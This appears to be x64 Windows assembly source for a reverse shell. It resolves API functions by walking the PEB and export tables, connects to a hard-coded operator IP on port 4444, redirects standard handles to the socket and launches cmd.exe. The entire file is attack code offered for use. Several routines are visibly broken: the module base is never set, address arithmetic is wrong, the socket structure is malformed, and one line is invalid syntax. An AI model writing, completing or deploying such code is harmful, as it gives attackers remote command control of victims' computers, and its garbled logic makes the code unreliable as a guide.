section .data
    ip_address db 192, 168, 217, 131       ; Replace with your IP address
    port dw 0x5c11                         ; Port 4444 in network byte order (0x115c in little endian)
    success_msg db 'Shell connected!', 0
    fail_msg db 'Shell failed!', 0
    kernel32 db 'kernel32.dll', 0
    ws2_32 db 'ws2_32.dll', 0
    LoadLibraryA_str db 'LoadLibraryA', 0
    GetProcAddress_str db 'GetProcAddress', 0
    WSAStartup_str db 'WSAStartup', 0
    socket_str db 'socket', 0
    connect_str db 'connect', 0
    SetStdHandle_str db 'SetStdHandle', 0
    CreateProcessA_str db 'CreateProcessA', 0
    ExitProcess_str db 'ExitProcess', 0
    WriteConsoleA_str db 'WriteConsoleA', 0
    cmd db 'cmd.exe', 0

section .bss
    wsadata resb 32                        ; WSAData buffer
    sock resq 1                            ; Space for the socket descriptor
    hKernel resq 1                         ; Handle to kernel32.dll
    hWS2_32 resq 1                         ; Handle to ws2_32.dll
    WSAStartup_ptr resq 1
    socket_ptr resq 1
    connect_ptr resq 1
    SetStdHandle_ptr resq 1
    CreateProcessA_ptr resq 1
    ExitProcess_ptr resq 1
    LoadLibraryA_ptr resq 1
    GetProcAddress_ptr resq 1
    WriteConsoleA_ptr resq 1
    hConsole resq 1

section .text
global _start

_start:
    ; Get base address of kernel32.dll
    mov rax, gs:[0x60]                    ; PEB
    mov rax, [rax + 0x18]                 ; PEB_LDR_DATA
    mov rax, [rax + 0x20]                 ; InMemoryOrderModuleList (first entry)
    mov rax, [rax]                        ; Next entry (second entry)
    mov rax, [rax + 0x20]                 ; Base address of kernel32.dll
    mov [hKernel], rax

    ; Resolve LoadLibraryA
    mov rcx, [hKernel]
    call FindFunction                     ; Find LoadLibraryA
    mov [LoadLibraryA_ptr], rax

    ; Resolve GetProcAddress
    lea rdx, [GetProcAddress_str]
    call rax                              ; Call LoadLibraryA's result
    mov [GetProcAddress_ptr], rax

    ; Use GetProcAddress to resolve all other functions
    lea rcx, [kernel32]
    call qword [LoadLibraryA_ptr]
    mov [hKernel], rax

    ; Resolve WriteConsoleA for diagnostics
    lea rdx, [WriteConsoleA_str]
    call qword [GetProcAddress_ptr]
    mov [WriteConsoleA_ptr], rax

    ; Output a diagnostic message to console
    call GetConsoleHandle
    lea rcx, [success_msg]
    call qword [WriteConsoleA_ptr]

    lea rdx, [WSAStartup_str]
    mov rcx, [hWS2_32]
    call qword [GetProcAddress_ptr]
    mov [WSAStartup_ptr], rax

    lea rdx, [socket_str]
    call qword [GetProcAddress_ptr]
    mov [socket_ptr], rax

    lea rdx, [connect_str]
    call qword [GetProcAddress_ptr]
    mov [connect_ptr], rax

    lea rdx, [SetStdHandle_str]
    mov rcx, [hKernel]
    call qword [GetProcAddress_ptr]
    mov [SetStdHandle_ptr], rax

    lea rdx, [CreateProcessA_str]
    call qword [GetProcAddress_ptr]
    mov [CreateProcessA_ptr], rax

    lea rdx, [ExitProcess_str]
    call qword [GetProcAddress_ptr]
    mov [ExitProcess_ptr], rax

    ; Call WSAStartup
    mov rcx, 0x202                        ; Version 2.2
    lea rdx, [wsadata]                    ; Pointer to WSAData
    call qword [WSAStartup_ptr]

    ; Create socket
    mov rcx, 2                            ; AF_INET
    mov rdx, 1                            ; SOCK_STREAM
    mov r8, 6                             ; IPPROTO_TCP
    call qword [socket_ptr]
    mov [sock], rax                       ; Save the socket descriptor

    ; Prepare sockaddr_in structure
    mov rax, 0
    mov ax, [port]                        ; Set port
    shl rax, 16
    mov al, [ip_address]                  ; Set IP address
    mov ah, [ip_address + 1]
    shl rax, 16
    mov al, [ip_address + 2]
    mov ah, [ip_address + 3]

    ; Connect to remote server
    push rax                              ; sockaddr_in
    mov rcx, [sock]                       ; Socket descriptor
    lea rdx, [rsp]                        ; Pointer to sockaddr_in
    mov r8d, 16                           ; Length of sockaddr_in
    call qword [connect_ptr]
    test rax, rax                         ; Check if the connection was successful
    jnz ConnectionFailed

    ; Redirect stdin, stdout, stderr to socket using SetStdHandle
    mov rcx, -10                          ; STD_INPUT_HANDLE
    mov rdx, [sock]
    call qword [SetStdHandle_ptr]

    mov rcx, -11                          ; STD_OUTPUT_HANDLE
    mov rdx, [sock]
    call qword [SetStdHandle_ptr]

    mov rcx, -12                          ; STD_ERROR_HANDLE
    mov rdx, [sock]
    call qword [SetStdHandle_ptr]

    ; Execute cmd.exe
    xor rax, rax
    lea rdx, [cmd]
    call qword [CreateProcessA_ptr]

    ; ExitProcess
    xor rcx, rcx
    call qword [ExitProcess_ptr]

ConnectionFailed:
    ; If connection fails, output a failure message and exit
    lea rcx, [fail_msg]
    call qword [WriteConsoleA_ptr]
    call qword [ExitProcess_ptr]

; Routine to find the address of a function within a module
FindFunction:
    push rbx
    mov rbx, [rcx + 0x3c]                 ; PE header offset
    add rbx, rcx                          ; rbx = &PE header
    mov ebx, [rbx + 0x88]                 ; Export table RVA
    add rbx, rax                          ; rbx = &Export table
    mov ecx, [rbx + 0x18]                 ; Number of names
    mov edx, [rbx + 0x20]                 ; AddressOfNames RVA
    add rdx, rax                          ; rdx = &AddressOfNames

FindLoop:
    dec rcx                               ; Decrement name counter
    js NotFound                           ; If counter is less than zero, exit
    mov esi, [rdx + rcx*4]                ; RVA of current function name
    add rsi, rax                          ; rsi = function name address
    cmp [rsi], rdi                        ; Compare function name
    jnz FindLoop                          ; If not found, continue searching
    mov edx, [rbx + 0x24]                 ; AddressOfNameOrdinals RVA
    add rdx, rax                          ; rdx = &AddressOfNameOrdinals
    mov cx, [rdx + rcx*2]                 ; Get ordinal
    mov edx, [rbx + 0x1c]                 ; AddressOfFunctions RVA
    add rdx, rax                          ; rdx = &AddressOfFunctions
    mov eax, [rdx + rcx*4]                ; Get function RVA
    add rax, rax                          ; rax = function address
    pop rbx
    ret

NotFound:
    xor rax, rax                          ; Clear rax (return 0)
    pop rbx
    ret

; Get console handle for diagnostics
GetConsoleHandle:
    ; This routine retrieves the console handle for standard output
    ; It is necessary to print diagnostic messages using WriteConsoleA

    mov rcx, -11                          ; STD_OUTPUT_HANDLE
    call GetStdHandle                     ; Get the standard output handle
    mov [hConsole], rax                   ; Store handle in hConsole
    ret

GetStdHandle:
    ; Resolve GetStdHandle dynamically from kernel32.dll
    mov rcx, [hKernel]
    lea rdx, [rel 'GetStdHandle', 0]
    call qword [GetProcAddress_ptr]
    mov rax, rax                          ; Call GetStdHandle
    ret